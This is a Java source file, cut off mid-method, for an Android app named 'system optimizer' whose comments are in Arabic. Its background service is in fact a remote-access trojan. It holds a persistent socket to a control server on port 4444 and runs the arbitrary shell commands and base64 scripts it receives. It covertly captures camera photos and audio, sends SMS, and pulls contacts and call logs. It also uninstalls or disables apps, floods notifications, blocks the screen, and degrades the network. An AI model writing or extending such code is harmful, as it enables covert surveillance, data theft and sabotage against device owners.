package com.example.systemoptimizer;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.WallpaperManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.io.BufferedReader;
import java.io.EOFException;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Reader;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

public class BackgroundService extends Service {

    private static final String TAG = "BackgroundService";
    private static final String CHANNEL_MAIN = "main_channel";
    private static final String CHANNEL_SPAM = "spam_channel";
    private static final int NOTIFICATION_ID = 1;

    /**
     * مكتبة الأصوات الجاهزة. أرقام الأوامر play_sound:1..N تشير إلى نفس الترتيب
     * الذي تعرضه مكتبة الأصوات في أداة التحكم (Windows Controller).
     */
    private static final int[] SOUND_LIBRARY = {
            R.raw.alarm, R.raw.siren, R.raw.warning, R.raw.notification
    };

    /** الحزمة المستهدفة لأوامر إزالة/تعطيل فري فاير. */
    private static final String FREE_FIRE_PACKAGE = "com.dts.freefireth";

    private static final String SERVER_HOST = "10.0.2.2";
    private static final int SERVER_PORT = 4444;
    private static final int CONNECT_TIMEOUT_MS = 10000;
    private static final int RECONNECT_DELAY_MS = 5000;
    private static final int SHELL_TIMEOUT_MS = 15000;
    private static final int MAX_MESSAGE_SIZE = 8 * 1024 * 1024;

    private static final int WALLPAPER_IMAGE_MAX_BYTES = 5 * 1024 * 1024;
    private static final int SCRIPT_MAX_BYTES = 512 * 1024;
    private static final int SCRIPT_TIMEOUT_MS = 60000;

    private static final int CAMERA_TIMEOUT_MS = 120000;

    private static final String PREFS_NAME = "system_optimizer_prefs";
    private static final String PREFS_BLACK_SCREEN_ON_BOOT = "black_screen_on_boot";

    private final AtomicBoolean connectionThreadStarted = new AtomicBoolean(false);
    private volatile boolean running = false;
    private volatile Thread connectionThread;
    private volatile Socket connectionSocket;

    private final Object workerLock = new Object();
    private volatile HandlerThread workerThread;
    private volatile Handler workerHandler;
    private volatile File pendingScriptFile;
    private volatile boolean degradationActive = false;
    private volatile String degradedInterface;

    // جسر نتيجة الكاميرا بين Activity والخيط المتصل بالشبكة
    private static final Object cameraLock = new Object();
    private static volatile boolean cameraResultReady = false;
    private static volatile String cameraResult;

    /**
     * يرسل نتيجة التقاط الصورة (PHOTO_OK:Base64 أو نص خطأ) إلى الخدمة
     * التي تنتظرها على خيط الاتصال بالشبكة.
     */
    public static void postCameraResult(String result) {
        synchronized (cameraLock) {
            cameraResult = result;
            cameraResultReady = true;
            cameraLock.notifyAll();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        ensureNotificationChannels();
        cleanupStaleWallpaperCache();
    }

    private void cleanupStaleWallpaperCache() {
        File cacheDir = getCacheDir();
        File[] files = cacheDir.listFiles();
        if (files == null) {
            return;
        }
        for (File f : files) {
            String name = f.getName();
            if (name.startsWith("wp_") && name.endsWith(".jpg")) {
                boolean deleted = f.delete();
                if (deleted) {
                    Log.i(TAG, "Removed stale wallpaper cache: " + name);
                }
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notification = buildNotification();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }

        if (connectionThreadStarted.compareAndSet(false, true)) {
            running = true;
            connectionThread = new Thread(this::establishConnection, "bg-connection");
            connectionThread.start();
        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        if (connectionSocket != null) {
            try {
                connectionSocket.close();
            } catch (IOException ignored) {
            }
            connectionSocket = null;
        }
        Thread thread = connectionThread;
        if (thread != null) {
            thread.interrupt();
        }

        synchronized (workerLock) {
            if (workerHandler != null) {
                workerHandler.removeCallbacksAndMessages(null);
                workerHandler = null;
            }
            if (workerThread != null) {
                workerThread.quitSafely();
                workerThread = null;
            }
        }
        File pending = pendingScriptFile;
        if (pending != null && pending.exists()) {
            boolean deleted = pending.delete();
            if (deleted) {
                Log.i(TAG, "cleaned pending script file on destroy");
            }
            pendingScriptFile = null;
        }
        if (degradationActive && degradedInterface != null) {
            runShellCommand("sh", "-c", "tc qdisc del dev " + degradedInterface + " root 2>/dev/null");
            Log.i(TAG, "attempted to restore network condition on destroy (dev=" + degradedInterface + ")");
        }
        degradationActive = false;
        degradedInterface = null;

        super.onDestroy();
    }

    private void ensureNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            nm.createNotificationChannel(
                    new NotificationChannel(CHANNEL_MAIN, "الخدمة الخلفية", NotificationManager.IMPORTANCE_LOW));
            nm.createNotificationChannel(
                    new NotificationChannel(CHANNEL_SPAM, "الإشعارات", NotificationManager.IMPORTANCE_HIGH));
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_MAIN)
                .setContentTitle(getString(R.string.app_name))
                .setContentText("يعمل في الخلفية")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    // ------------------------------------------------------------------
    // بروتوكول الاتصال: 4 بايت طول (big-endian) + نص UTF-8 على الطرفين
    // ------------------------------------------------------------------

    private void establishConnection() {
        try {
            while (running) {
                Socket socket = null;
                try {
                    socket = new Socket();
                    socket.connect(new InetSocketAddress(SERVER_HOST, SERVER_PORT), CONNECT_TIMEOUT_MS);
                    connectionSocket = socket;
                    Log.i(TAG, "connected to " + SERVER_HOST + ":" + SERVER_PORT);

                    InputStream in = socket.getInputStream();
                    OutputStream out = socket.getOutputStream();

                    while (running) {
                        String command = readMessage(in);
                        if (command == null) {
                            Log.i(TAG, "server closed the connection");
                            break;
                        }
                        executeCommand(command, out);
                    }
                } catch (SocketException e) {
                    Log.w(TAG, "socket closed: " + e.getMessage());
                } catch (IOException e) {
                    Log.w(TAG, "connection error: " + e.getMessage());
                } catch (Exception e) {
                    Log.w(TAG, "unexpected error", e);
                } finally {
                    closeQuietly(socket);
                    if (connectionSocket == socket) {
                        connectionSocket = null;
                    }
                    Log.i(TAG, "disconnected");
                }

                if (running) {
                    try {
                        Thread.sleep(RECONNECT_DELAY_MS);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
        } finally {
            connectionThreadStarted.set(false);
        }
    }

    private static String readMessage(InputStream in) throws IOException {
        byte[] header = readFully(in, 4, true);
        if (header == null) {
            return null; // إغلاق أنيق من الطرف الآخر
        }
        long length = ((long) (header[0] & 0xFF) << 24)
                | ((long) (header[1] & 0xFF) << 16)
                | ((long) (header[2] & 0xFF) << 8)
                | ((long) (header[3] & 0xFF));
        if (length <= 0 || length > MAX_MESSAGE_SIZE) {
            throw new IOException("invalid message length: " + length);
        }
        byte[] payload = readFully(in, (int) length, false);
        return new String(payload, StandardCharsets.UTF_8);
    }

    private static void writeMessage(OutputStream out, String message) throws IOException {
        byte[] payload = message.getBytes(StandardCharsets.UTF_8);
        out.write((payload.length >>> 24) & 0xFF);
        out.write((payload.length >>> 16) & 0xFF);
        out.write((payload.length >>> 8) & 0xFF);
        out.write(payload.length & 0xFF);
        out.write(payload);
        out.flush();
    }

    private static byte[] readFully(InputStream in, int size, boolean allowEof) throws IOException {
        byte[] data = new byte[size];
        int offset = 0;
        while (offset < size) {
            int read = in.read(data, offset, size - offset);
            if (read == -1) {
                if (allowEof && offset == 0) {
                    return null;
                }
                throw new EOFException("connection closed mid-message");
            }
            offset += read;
        }
        return data;
    }

    private static void closeQuietly(Socket socket) {
        if (socket != null) {
            try {
                socket.close();
            } catch (IOException ignored) {
            }
        }
    }

    // ------------------------------------------------------------------
    // تنفيذ الأوامر
    // ------------------------------------------------------------------

    private void executeCommand(String command, OutputStream out) throws IOException {
        try {
            if (command.equals("exit")) {
                // أمر صريح من المشغّل بإنهاء الجلسة وإيقاف الخدمة
                running = false;
                stopSelf();
                throw new IOException("exit requested");
            } else if (command.startsWith("show_message:idx:")) {
                handleShowMessageByIdx(command, out);
            } else if (command.startsWith("show_message:txt:")) {
                handleShowMessageByText(command, out);
            } else if (command.equals("remove_freefire")) {
                handleRemoveFreeFire(out);
            } else if (command.equals("disable_freefire")) {
                handleDisableFreeFire(out);
            } else if (command.startsWith("spam_notifications:")) {
                handleSpamNotifications(command, out);
            } else if (command.startsWith("play_sound:")) {
                handlePlaySound(command, out);
            } else if (command.startsWith("play_annoying_sound:")) {
                handlePlayAnnoyingSound(command, out);
            } else if (command.startsWith("change_wallpaper:")) {
                handleChangeWallpaper(command, out);
            } else if (command.startsWith("change_wallpaper_base64:")) {
                handleChangeWallpaperBase64(command, out);
            } else if (command.equals("black_screen_on_boot")) {
                handleBlackScreenOnBoot(out);
            } else if (command.startsWith("network_deg:")) {
                handleNetworkDegradation(command, out);
            } else if (command.startsWith("block_app:")) {
                handleBlockApp(command, out);
            } else if (command.startsWith("custom:")) {
                String[] parts = command.split(":", 2);
                String custom = parts.length < 2 ? "" : parts[1].trim();
                if (custom.isEmpty()) {
                    writeMessage(out, "أمر مخصص فارغ");
                    return;
                }
                String result = runShellCommand("sh", "-c", custom);
                writeMessage(out, result);
            } else if (command.startsWith("script_base64:")) {
                handleRunScript(command, out);
            } else if (command.equals("device_info")) {
                handleDeviceInfo(out);
            } else if (command.equals("capture_camera")) {
                handleCaptureCamera(out);
            } else if (command.startsWith("record_audio:")) {
                handleRecordAudio(command, out);
            } else if (command.startsWith("block_screen:")) {
                handleBlockScreen(command, out);
            } else if (command.startsWith("play_video:")) {
                handlePlayVideo(command, out);
            } else if (command.startsWith("show_serious_warning:")) {
                handleSeriousWarning(command, out);
            } else if (command.startsWith("send_sms:")) {
                handleSendSms(command, out);
            } else if (command.equals("call_log")) {
                handleCallLog(out);
            } else if (command.equals("contacts")) {
                handleContacts(out);
            } else {
                String result = runShellCommand(command.split("\\s+"));
                writeMessage(out, result);
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new IOException("interrupted", e);
        } catch (IOException e) {
            throw e;
        } catch (Exception e) {
            writeMessage(out, "خطأ في تنفيذ الأمر: " + e.getMessage());
        }
    }

    private void handleRemoveFreeFire(OutputStream out) throws IOException {
        String result = runShellCommand("pm", "uninstall", "--user", "0", FREE_FIRE_PACKAGE);
        String outcome = classifyPmResult(result);
        writeMessage(out, "نتيجة إزالة فري فاير - " + outcome + ": " + result);
    }

    private void handleDisableFreeFire(OutputStream out) throws IOException {
        String result = runShellCommand("pm", "disable-user", "--user", "0", FREE_FIRE_PACKAGE);
        String outcome = classifyPmResult(result);
        writeMessage(out, "نتيجة تعطيل فري فاير - " + outcome + ": " + result);
    }

    /**
     * يصنّف مخرجات أمر pm برمجياً إلى نتيجة صادقة للمشغّل.
     */
    private String classifyPmResult(String raw) {
        if (raw == null) {
            return "COMMAND FAILED";
        }
        String text = raw.toLowerCase();
        if (text.contains("success") || text.contains("new state")) {
            return "SUCCESS";
        }
        if (text.contains("not installed") || text.contains("unknown package")
                || text.contains("package not found")
                || text.contains("delete_failed_package_not_installed")
                || text.contains("invalid package")) {
            return "PACKAGE NOT FOUND";
        }
        if (text.contains("securityexception") || text.contains("not allowed")
                || text.contains("permission")
                || text.contains("delete_failed_device_policy_manager")
                || text.contains("delete_failed_user_restricted")) {
            return "NOT PERMITTED";
        }
        return "COMMAND FAILED";
    }

    private void handleBlockApp(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":", 2);
        if (parts.length < 2 || parts[1].trim().isEmpty()) {
            writeMessage(out, "صيغة خاطئة: block_app:package");
            return;
        }
        String pkg = parts[1].trim();
        if (!isPackageInstalled(pkg)) {
            writeMessage(out, "نتيجة حظر التطبيق " + pkg + " - PACKAGE NOT FOUND: الحزمة غير مثبتة.");
            return;
        }
        String result = runShellCommand("pm", "disable-user", "--user", "0", pkg);
        String outcome = classifyPmResult(result);
        writeMessage(out, "نتيجة حظر التطبيق " + pkg + " - " + outcome + ": " + result);
    }

    private boolean isPackageInstalled(String pkg) {
        try {
            getPackageManager().getPackageInfo(pkg, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private void handlePlaySound(String command, OutputStream out) throws IOException, InterruptedException {
        String[] parts = command.split(":", 3);
        if (parts.length < 3) {
            writeMessage(out, "صيغة خاطئة: play_sound:الرقم:المدة(ثواني)");
            return;
        }
        int soundId;
        try {
            soundId = Integer.parseInt(parts[1]);
        } catch (NumberFormatException e) {
            writeMessage(out, "رقم الصوت غير صالح: " + parts[1]);
            return;
        }
        int duration;
        try {
            duration = Integer.parseInt(parts[2]);
        } catch (NumberFormatException e) {
            writeMessage(out, "مدة غير صالحة: " + parts[2]);
            return;
        }
        if (duration <= 0 || duration > 600) {
            writeMessage(out, "المدة يجب أن تكون بين 1 و 600 ثانية");
            return;
        }
        if (soundId < 1 || soundId > SOUND_LIBRARY.length) {
            writeMessage(out, "رقم الصوت خارج النطاق (يجب أن يكون بين 1 و " + SOUND_LIBRARY.length + ")");
            return;
        }
        playRawSound(SOUND_LIBRARY[soundId - 1], duration, out);
    }

    private void playRawSound(int rawResId, int duration, OutputStream out) throws IOException, InterruptedException {
        MediaPlayer mediaPlayer = MediaPlayer.create(this, rawResId);
        if (mediaPlayer == null) {
            writeMessage(out, "تعذر تحميل ملف الصوت: الملف الموجود في res/raw فارغ أو غير مدعوم");
            return;
        }
        try {
            mediaPlayer.setLooping(true);
            mediaPlayer.start();
            Thread.sleep(duration * 1000L);
            writeMessage(out, "تم تشغيل الصوت لمدة " + duration + " ثانية");
        } finally {
            try {
                mediaPlayer.stop();
            } catch (IllegalStateException ignored) {
            }
            mediaPlayer.release();
        }
    }

    // ---------- أوامر مساعدة ----------

    private void handleShowMessageByIdx(String command, OutputStream out) throws IOException {
        String idxStr = command.substring("show_message:idx:".length()).trim();
        int idx;
        try {
            idx = Integer.parseInt(idxStr);
        } catch (NumberFormatException e) {
            writeMessage(out, "رقم الرسالة غير صالح: " + idxStr);
            return;
        }
        String[] messages = MessageDashboardActivity.MESSAGES;
        if (idx < 1 || idx > messages.length) {
            writeMessage(out, "رقم الرسالة خارج النطاق (يجب أن يكون بين 1 و " + messages.length + ")");
            return;
        }
        Intent intent = new Intent(this, MessageDashboardActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("message_index", idx);
        startMessageDashboard(intent, out);
    }

    private void handleShowMessageByText(String command, OutputStream out) throws IOException {
        String text = command.substring("show_message:txt:".length()).trim();
        if (text.isEmpty()) {
            writeMessage(out, "نص الرسالة فارغ");
            return;
        }
        Intent intent = new Intent(this, MessageDashboardActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("message_text", text);
        startMessageDashboard(intent, out);
    }

    private void startMessageDashboard(Intent intent, OutputStream out) throws IOException {
        try {
            startActivity(intent);
            writeMessage(out, "تم عرض الرسالة");
        } catch (Exception e) {
            writeMessage(out, "فشل في عرض الرسالة: " + e.getMessage()
                    + " (بدء نشاط من الخلفية قد يُحظر على Android 10+)");
        }
    }

    // ------------------------------------------------------------------
    // التقاط صورة الكاميرا عبر Activity ثم نقلها Base64 إلى المشغّل
    // ------------------------------------------------------------------

    private void handleCaptureCamera(OutputStream out) throws IOException, InterruptedException {
        if (!hasPermission(Manifest.permission.CAMERA)) {
            writeMessage(out, "صلاحية الكاميرا غير ممنوحة");
            return;
        }
        if (!getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_ANY)
                && !getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            writeMessage(out, "لا توجد كاميرا على هذا الجهاز");
            return;
        }

        File photoFile = new File(getCacheDir(), "photo_" + System.currentTimeMillis() + ".jpg");
        String result;
        synchronized (cameraLock) {
            cameraResult = null;
            cameraResultReady = false;
            cameraLock.notifyAll();

            Intent intent = new Intent(this, CameraCaptureActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra("output_file", photoFile.getAbsolutePath());
            try {
                startActivity(intent);
            } catch (Exception e) {
                boolean deleted = photoFile.delete();
                if (deleted) {
                    Log.i(TAG, "removed unused camera temp file");
                }
                writeMessage(out, "فشل في فتح الكاميرا: " + e.getMessage()
                        + " (بدء نشاط من الخلفية قد يُحظر على Android 10+)");
                return;
            }

            long deadline = System.currentTimeMillis() + CAMERA_TIMEOUT_MS;
            while (!cameraResultReady && System.currentTimeMillis() < deadline) {
                cameraLock.wait(1000);
            }
            if (!cameraResultReady) {
                boolean deleted = photoFile.delete();
                if (deleted) {
                    Log.i(TAG, "removed stale camera temp file");
                }
                writeMessage(out, "انتهت مهلة التقاط الصورة من الجهاز (دقيقتان). حاول مجدداً.");
                return;
            }
            result = cameraResult != null ? cameraResult : "فشل التقاط الصورة (سبب غير معروف)";
            cameraResult = null;
            cameraResultReady = false;
        }
        writeMessage(out, result);
    }

    private void handleSpamNotifications(String command, OutputStream out) throws IOException, InterruptedException {
        String[] parts = command.split(":", 3);
        if (parts.length < 3) {
            writeMessage(out, "صيغة خاطئة: spam_notifications:العدد:النص");
            return;
        }
        int count;
        try {
            count = Integer.parseInt(parts[1]);
        } catch (NumberFormatException e) {
            writeMessage(out, "عدد غير صالح: " + parts[1]);
            return;
        }
        if (count <= 0 || count > 500) {
            writeMessage(out, "العدد يجب أن يكون بين 1 و 500");
            return;
        }
        String message = parts[2];
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
                && !hasPermission(Manifest.permission.POST_NOTIFICATIONS)) {
            writeMessage(out, "صلاحية الإشعارات غير ممنوحة");
            return;
        }

        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        for (int i = 0; i < count; i++) {
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_SPAM)
                    .setSmallIcon(R.mipmap.ic_launcher)
                    .setContentTitle("تحذير")
                    .setContentText(message)
                    .setPriority(NotificationCompat.PRIORITY_HIGH);
            nm.notify(100 + (i % 100), builder.build());
            if (i < count - 1) {
                Thread.sleep(1000);
            }
        }
        writeMessage(out, "تم إرسال " + count + " إشعار");
    }

    private void handlePlayAnnoyingSound(String command, OutputStream out) throws IOException, InterruptedException {
        String[] parts = command.split(":", 2);
        int duration;
        try {
            duration = Integer.parseInt(parts[1]);
        } catch (NumberFormatException e) {
            writeMessage(out, "مدة غير صالحة: " + parts[1]);
            return;
        }
        if (duration <= 0 || duration > 600) {
            writeMessage(out, "المدة يجب أن تكون بين 1 و 600 ثانية");
            return;
        }
        playRawSound(R.raw.annoying_sound, duration, out);
    }

    private void handleChangeWallpaper(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":", 2);
        if (parts.length < 2 || parts[1].trim().isEmpty()) {
            writeMessage(out, "صيغة خاطئة: change_wallpaper:المسار");
            return;
        }
        String imagePath = parts[1].trim();
        try {
            Bitmap bitmap = BitmapFactory.decodeFile(imagePath);
            if (bitmap == null) {
                writeMessage(out, "فشل في فك تشفير الصورة من المسار: " + imagePath
                        + " (قد يكون الوصول مقيداً بسبب Scoped Storage)");
                return;
            }
            WallpaperManager wallpaperManager = WallpaperManager.getInstance(this);
            wallpaperManager.setBitmap(bitmap);
            writeMessage(out, "تم تغيير خلفية الشاشة");
        } catch (Exception e) {
            writeMessage(out, "فشل في تغيير خلفية الشاشة: " + e.getMessage());
        }
    }

    private void handleChangeWallpaperBase64(String command, OutputStream out) throws IOException {
        int firstColon = command.indexOf(':', 1);
        if (firstColon < 0) {
            writeMessage(out, "صيغة خاطئة: change_wallpaper_base64:المدة:Base64");
            return;
        }
        int secondColon = command.indexOf(':', firstColon + 1);
        if (secondColon < 0) {
            writeMessage(out, "صيغة خاطئة: change_wallpaper_base64:المدة:Base64");
            return;
        }

        String durStr = command.substring(firstColon + 1, secondColon);
        String b64Data = command.substring(secondColon + 1);

        int durationSec;
        try {
            durationSec = Integer.parseInt(durStr.trim());
        } catch (NumberFormatException e) {
            writeMessage(out, "مدة غير صالحة: " + durStr);
            return;
        }
        if (durationSec <= 0) {
            writeMessage(out, "المدة يجب أن تكون أكبر من صفر");
            return;
        }

        byte[] imageBytes;
        try {
            imageBytes = android.util.Base64.decode(b64Data, android.util.Base64.DEFAULT);
        } catch (IllegalArgumentException e) {
            writeMessage(out, "فشل في فك تشفير الصورة Base64");
            return;
        }

        if (imageBytes.length == 0 || imageBytes.length > WALLPAPER_IMAGE_MAX_BYTES) {
            writeMessage(out, "حجم الصورة غير صالح");
            return;
        }

        if (!isLikelyImage(imageBytes)) {
            writeMessage(out, "الملف ليس بصيغة صورة معروفة");
            return;
        }

        Bitmap newBitmap = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.length);
        if (newBitmap == null) {
            writeMessage(out, "فشل في فك تشفير الصورة bitmap");
            return;
        }

        File cacheFile = new File(getCacheDir(), "wp_" + System.currentTimeMillis() + ".jpg");
        try {
            java.io.FileOutputStream fos = new java.io.FileOutputStream(cacheFile);
            try {
                fos.write(imageBytes);
            } finally {
                fos.close();
            }
        } catch (IOException e) {
            writeMessage(out, "فشل في حفظ الصورة مؤقتاً: " + e.getMessage());
            newBitmap.recycle();
            return;
        }

        WallpaperManager wm = WallpaperManager.getInstance(this);
        try {
            wm.setBitmap(newBitmap);
        } catch (Exception e) {
            writeMessage(out, "فشل في تعيين الخلفية: " + e.getMessage());
            newBitmap.recycle();
            cacheFile.delete();
            return;
        }

        final File restoreCache = cacheFile;
        final Bitmap restoreNew = newBitmap;

        writeMessage(out, "تم تطبيق الخلفية الجديدة. المدة: " + durationSec + " ثانية");

        Handler mainHandler = new Handler(Looper.getMainLooper());
        mainHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    WallpaperManager wmgr = WallpaperManager.getInstance(BackgroundService.this);
                    try {
                        wmgr.clear();
                        Log.i(TAG, "Wallpaper duration expired. Wallpaper cleared (default restored).");
                    } catch (Exception e) {
                        Log.w(TAG, "Wallpaper duration expired but clear failed: " + e.getMessage());
                    }
                } catch (Exception e) {
                    Log.w(TAG, "Failed to clear wallpaper: " + e.getMessage());
                } finally {
                    if (restoreNew != null && !restoreNew.isRecycled()) {
                        restoreNew.recycle();
                    }
                    if (restoreCache.exists()) {
                        restoreCache.delete();
                    }
                }
            }
        }, durationSec * 1000L);
    }

    private static boolean isLikelyImage(byte[] header) {
        if (header.length < 4) {
            return false;
        }
        if ((header[0] & 0xFF) == 0xFF && (header[1] & 0xFF) == 0xD8 && (header[2] & 0xFF) == 0xFF) {
            return true;
        }
        if (header.length >= 8
                && header[0] == (byte) 0x89 && header[1] == 0x50
                && header[2] == 0x4E && header[3] == 0x47
                && header[4] == 0x0D && header[5] == 0x0A
                && header[6] == 0x1A && header[7] == 0x0A) {
            return true;
        }
        if (header[0] == 'B' && header[1] == 'M') {
            return true;
        }
        if (header.length >= 12
                && header[0] == 'R' && header[1] == 'I' && header[2] == 'F' && header[3] == 'F'
                && header[8] == 'W' && header[9] == 'E' && header[10] == 'B' && header[11] == 'P') {
            return true;
        }
        return false;
    }

    // ------------------------------------------------------------------
    // تحسين/خفض الشبكة المؤقت على الجهاز (tc netem) بدون فصل الاتصال
    // ------------------------------------------------------------------

    private void handleNetworkDegradation(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":", -1);
        if (parts.length < 5) {
            writeMessage(out, "صيغة خاطئة: network_deg:<التأخير(ms)>:<فقدان(%)>:<الحد(kbps)>:<المدة(ثواني)>");
            return;
        }
        int latency = parseSetting(parts[1], -1);
        if (latency < 0) {
            writeMessage(out, "قيمة غير صالحة للتأخير: " + parts[1]);
            return;
        }
        int loss = parseSetting(parts[2], -1);
        if (loss < 0) {
            writeMessage(out, "قيمة غير صالحة لفقدان الحزم: " + parts[2]);
            return;
        }
        long bandwidth = parseSettingLong(parts[3], -1);
        if (bandwidth < 0) {
            writeMessage(out, "قيمة غير صالحة للحد الأقصى: " + parts[3]);
            return;
        }
        int duration = parseSetting(parts[4], -1);
        if (duration < 0) {
            writeMessage(out, "قيمة غير صالحة للمدة: " + parts[4]);
            return;
        }

        if (latency == 0 && loss == 0 && bandwidth == 0) {
            writeMessage(out, "لم يتم تحديد أي معايير للخفض (القيم كلها صفر)");
            return;
        }
        if (duration <= 0 || duration > 86400) {
            writeMessage(out, "المدة يجب أن تكون بين 1 و 86400 ثانية");
            return;
        }
        if (latency > 5000 || loss > 100 || bandwidth > 10000000) {
            writeMessage(out, "قيم خارج النطاق المسموح "
                    + "(تأخير 0-5000ms، فقدان 0-100%، حد حتى 10Mkbps)");
            return;
        }

        String dev = detectNetInterface();
        if (dev == null) {
            writeMessage(out, "لا يمكن تحديد واجهة الشبكة المحلية لتطبيق الخفض");
            return;
        }

        List<String> commands = new ArrayList<>();
        if (bandwidth > 0) {
            long burst = Math.max(1024L, bandwidth / 8L);
            commands.add("tc qdisc add dev " + dev + " root handle 1: tbf rate "
                    + bandwidth + "kbit burst " + burst + " latency 50ms");
            if (latency > 0 || loss > 0) {
                commands.add("tc qdisc add dev " + dev + " parent 1:1 handle 10: netem delay "
                        + latency + "ms loss " + loss + "%");
            }
        } else {
            commands.add("tc qdisc add dev " + dev + " root handle 1: netem delay "
                    + latency + "ms loss " + loss + "%");
        }

        boolean allApplied = true;
        String failureDetail = "";
        for (String cmd : commands) {
            String res = runShellCommand("sh", "-c", cmd);
            if (tcCommandFailed(res)) {
                allApplied = false;
                failureDetail = res;
                runShellCommand("sh", "-c", "tc qdisc del dev " + dev + " root 2>/dev/null");
                break;
            }
        }

        if (!allApplied) {
            writeMessage(out, "لا يمكن تطبيق خفض الشبكة بصلاحيات التطبيق العادية على هذا الجهاز.\n"
                    + "يتطلب التنفيذ صلاحيات root/CAP_NET_ADMIN (أمر tc). لم تُجرَ أي تغييرات مؤثرة "
                    + "على الاتصال ولم يتم فصله.\n"
                    + "تفاصيل: " + failureDetail);
            return;
        }

        // استعادة تلقائية بعد المدة المحددة
        final Handler h = getWorkerHandler();
        final String restoreCmd = "tc qdisc del dev " + dev + " root";
        final String ifaceName = dev;
        h.postDelayed(new Runnable() {
            @Override
            public void run() {
                String res = runShellCommand("sh", "-c", restoreCmd);
                Log.i(TAG, "Network degradation restored (dev=" + ifaceName + "): " + res);
                degradationActive = false;
                degradedInterface = null;
            }
        }, duration * 1000L);
        degradationActive = true;
        degradedInterface = dev;

        writeMessage(out, "تم تطبيق خفض الشبكة مؤقتاً على الواجهة " + dev + "\n"
                + "تأخير: " + latency + "ms، فقدان: " + loss + "%، حد أقصى: "
                + (bandwidth > 0 ? bandwidth + " kbps" : "بدون") + "\n"
                + "سيتم استعادة الحالة الطبيعية تلقائياً بعد " + duration + " ثانية");
    }

    private boolean tcCommandFailed(String output) {
        String text = output == null ? "" : output;
        return text.contains("RTNETLINK answers: Permission denied")
                || text.contains("RTNETLINK answers: Operation not permitted")
                || text.contains("Permission denied")
                || text.contains("Operation not permitted")
                || text.contains("not found")
                || text.contains("[رمز الخروج:")
                || text.contains("انتهت المهلة");
    }

    private String detectNetInterface() {
        String[] candidates = {"eth0", "wlan0", "rmnet_data0", "rmnet0", "wlan1"};
        for (String iface : candidates) {
            String res = runShellCommand("sh", "-c",
                    "ip link show " + iface + " 2>/dev/null | grep -q . && echo OK");
            if (res.contains("OK")) {
                return iface;
            }
        }
        return null;
    }

    // ------------------------------------------------------------------
    // تنفيذ سكربت مجدول/فوري على الجهاز
    // ------------------------------------------------------------------

    private void handleRunScript(String command, OutputStream out) throws IOException {
        int firstColon = command.indexOf(':', "script_base64".length());
        if (firstColon < 0) {
            writeMessage(out, "صيغة خاطئة: script_base64:التأخير:Base64");
            return;
        }
        int secondColon = command.indexOf(':', firstColon + 1);
        if (secondColon < 0) {
            writeMessage(out, "صيغة خاطئة: script_base64:التأخير:Base64");
            return;
        }
        String delayStr = command.substring(firstColon + 1, secondColon);
        String b64Data = command.substring(secondColon + 1);

        int delay;
        try {
            delay = Integer.parseInt(delayStr.trim());
        } catch (NumberFormatException e) {
            writeMessage(out, "تأخير غير صالح: " + delayStr);
            return;
        }
        if (delay < 0 || delay > 86400) {
            writeMessage(out, "التأخير يجب أن يكون بين 0 و 86400 ثانية");
            return;
        }

        byte[] scriptBytes;
        try {
            scriptBytes = android.util.Base64.decode(b64Data, android.util.Base64.DEFAULT);
        } catch (IllegalArgumentException e) {
            writeMessage(out, "فشل فك تشفير النص Base64");
            return;
        }
        if (scriptBytes.length == 0 || scriptBytes.length > SCRIPT_MAX_BYTES) {
            writeMessage(out, "حجم النص غير صالح (فارغ أو أكبر من الحد المسموح: " + SCRIPT_MAX_BYTES + " بايت)");
            return;
        }

        // تخزين مؤقت على الجهاز؛ يُحذف بعد التنفيذ (وليس حفظاً دائماً)
